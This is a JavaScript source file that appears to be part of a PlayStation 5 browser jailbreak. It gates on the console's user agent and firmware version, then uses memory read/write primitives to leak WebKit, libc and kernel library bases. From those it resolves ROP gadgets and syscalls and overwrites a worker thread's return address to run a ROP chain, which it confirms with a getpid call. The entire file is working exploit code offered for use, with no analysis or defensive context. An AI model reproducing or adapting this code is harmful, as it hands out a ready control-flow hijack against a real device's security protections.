// Minimal prepare() for payload menu — avoids parsing the full main.js ELF loader.
if (!navigator.userAgent.includes("PlayStation 5")) {
    alert("This is a PlayStation 5 Exploit. => " + navigator.userAgent);
    throw new Error("");
}

const supportedFirmwares = [
    "9.00", "9.20", "9.40", "9.60", "10.00", "10.01", "10.20",
    "10.40", "10.60", "11.00", "11.20", "11.40", "11.60",
    "12.00", "12.02", "12.20", "12.40", "12.60", "12.70"
];

const fwOffsetAliases = {
    "12.02": "12.00", "12.20": "12.00",
    "12.60": "12.40", "12.70": "12.40"
};

const fw_match = /PlayStation 5\/(\d+\.\d+)/.exec(navigator.userAgent);
window.fw_str = fw_match ? fw_match[1] : "";
window.fw_float = parseFloat(window.fw_str);
window.fw_offset_str = fwOffsetAliases[window.fw_str] || window.fw_str;

if (!supportedFirmwares.includes(fw_str)) {
    alert("Firmware " + fw_str + " is unsupported.");
    throw new Error("no offsets for fw " + fw_str);
}

function jbmark(tag, detail) {
    try {
        if (window.jb && typeof window.jb.mark === "function")
            window.jb.mark(tag, String(detail));
    } catch (e) { }
}

function find_worker(p, libKernelBase) {
    const PTHREAD_NEXT_THREAD_OFFSET = 0x38;
    const PTHREAD_STACK_ADDR_OFFSET = 0xA8;
    const PTHREAD_STACK_SIZE_OFFSET = 0xB0;

    for (let thread = p.read8(libKernelBase.add32(OFFSET_lk__thread_list));
        thread.low != 0x0 && thread.hi != 0x0;
        thread = p.read8(thread.add32(PTHREAD_NEXT_THREAD_OFFSET))) {
        let stack = p.read8(thread.add32(PTHREAD_STACK_ADDR_OFFSET));
        let stacksz = p.read8(thread.add32(PTHREAD_STACK_SIZE_OFFSET));
        if (stacksz.low == 0x80000)
            return stack;
    }
    throw new Error("failed to find worker.");
}

async function prepare(p, opts = {}) {
    opts = opts || {};
    const menu = !!opts.menu;

    let textArea = document.createElement("textarea");
    let textAreaVtPtr = p.read8(p.leakval(textArea).add32(0x18));
    let textAreaVtable = p.read8(textAreaVtPtr);
    textArea = null;

    let libSceNKWebKitBase = null;
    if (window.fw_float >= 9.00
        && typeof OFFSET_wk_host_constructor_candidates !== "undefined"
        && OFFSET_wk_host_constructor_candidates.length
        && typeof globalThis.__ps5NativeCtor === "number") {
        const ctor = globalThis.__ps5NativeCtor;
        for (const hc of OFFSET_wk_host_constructor_candidates) {
            const wb = ctor - hc;
            if (wb >= 0x800000000 && wb < 0x900000000 && wb % 0x4000 === 0) {
                libSceNKWebKitBase = new int64(wb % 0x100000000, Math.floor(wb / 0x100000000));
                break;
            }
        }
        if (libSceNKWebKitBase === null)
            throw new Error("no host-constructor candidate gave a valid base");
    } else {
        libSceNKWebKitBase = p.read8(textAreaVtable).sub32(OFFSET_wk_vtable_first_element);
    }

    let libSceLibcInternalBase = p.read8(libSceNKWebKitBase.add32(OFFSET_wk_memset_import));
    libSceLibcInternalBase.sub32inplace(OFFSET_lc_memset);

    let libKernelBase = p.read8(libSceNKWebKitBase.add32(OFFSET_wk___stack_chk_guard_import));
    libKernelBase.sub32inplace(OFFSET_lk___stack_chk_guard);

    let gadgets = {};
    let syscalls = {};
    for (let gadget in wk_gadgetmap)
        gadgets[gadget] = libSceNKWebKitBase.add32(wk_gadgetmap[gadget]);
    for (let sysc in syscall_map)
        syscalls[sysc] = libKernelBase.add32(syscall_map[sysc]);

    let nogc = [];

    function malloc(sz, type = 4) {
        let backing;
        if (menu) {
            backing = new Uint32Array(sz + 0x400);
        } else if (type == 1) {
            backing = new Uint8Array(1000 + sz);
        } else if (type == 2) {
            backing = new Uint16Array(0x2000 + sz);
        } else {
            backing = new Uint32Array(0x10000 + sz);
        }
        nogc.push(backing);
        let ptr = p.read8(p.leakval(backing).add32(0x10));
        ptr.backing = backing;
        return ptr;
    }

    async function wait_for_worker() {
        return new Promise((resolve) => {
            worker.onmessage = function () { resolve(1); };
            worker.postMessage(0);
        });
    }

    let worker = new Worker("rop_slave.js");
    await wait_for_worker();
    await wait_for_worker();
    await new Promise(resolve => setTimeout(resolve, 5));

    let worker_stack = find_worker(p, libKernelBase);
    let original_context = malloc(0x40);

    let return_address_ptr;
    if (menu && typeof OFFSET_WORKER_STACK_OFFSET !== "undefined") {
        return_address_ptr = worker_stack.add32(OFFSET_WORKER_STACK_OFFSET);
    } else if (typeof OFFSET_lk_worker_wait_return !== "undefined") {
        return_address_ptr = worker_stack.add32(OFFSET_WORKER_STACK_OFFSET);
    } else {
        return_address_ptr = worker_stack.add32(OFFSET_WORKER_STACK_OFFSET);
    }

    let original_return_address = p.read8(return_address_ptr);
    let stack_pointer_ptr = return_address_ptr.add32(0x8);

    function pre_chain(chain) {
        chain.push(gadgets["pop rdi"]);
        chain.push(original_context);
        chain.push(libSceLibcInternalBase.add32(OFFSET_lc_setjmp));
    }

    async function launch_chain(chain) {
        let original_value_of_stack_pointer_ptr = p.read8(stack_pointer_ptr);
        chain.push_write8(original_context, original_return_address);
        chain.push_write8(original_context.add32(0x10), return_address_ptr);
        chain.push_write8(stack_pointer_ptr, original_value_of_stack_pointer_ptr);
        chain.push(gadgets["pop rdi"]);
        chain.push(original_context);
        chain.push(libSceLibcInternalBase.add32(OFFSET_lc_longjmp));
        p.write8(return_address_ptr, gadgets["pop rsp"]);
        p.write8(stack_pointer_ptr, chain.stack_entry_point);
        let p1 = await new Promise((resolve) => {
            worker.onmessage = function () { resolve(1); };
            worker.postMessage(0);
        });
        if (p1 == 0)
            throw new Error("The rop thread ran away.");
    }

    let p2 = {
        write8: p.write8, write4: p.write4, write2: p.write2, write1: p.write1,
        read8: p.read8, read4: p.read4, read2: p.read2, read1: p.read1,
        leakval: p.leakval,
        pre_chain, launch_chain, malloc,
        libSceNKWebKitBase, libSceLibcInternalBase, libKernelBase,
        nogc, syscalls, gadgets
    };

    const stackSize = opts.stackSize || (menu ? 0x28000 : 0x80000);
    const reservedStack = opts.reservedStack || (menu ? 0x4000 : 0x10000);
    let chain = new worker_rop(p2, stackSize, reservedStack);

    const JB_POISON = new int64(0xDEADBEEF, 0x00C0FFEE);
    p.write8(chain.return_value, JB_POISON);
    let pid = await chain.syscall(SYS_GETPID);
    if (pid.low == JB_POISON.low && pid.hi == JB_POISON.hi)
        throw new Error("The ROP chain never executed.");
    if (pid.low == 0)
        throw new Error("Webkit exploit failed.");
    return { p: p2, chain };
}

window.prepare = prepare;

let fwScript = document.createElement("script");
document.body.appendChild(fwScript);
fwScript.setAttribute("src", "../offsets/" + window.fw_offset_str + ".js?b="
    + (window.P2JB_BUILD || "dev"));
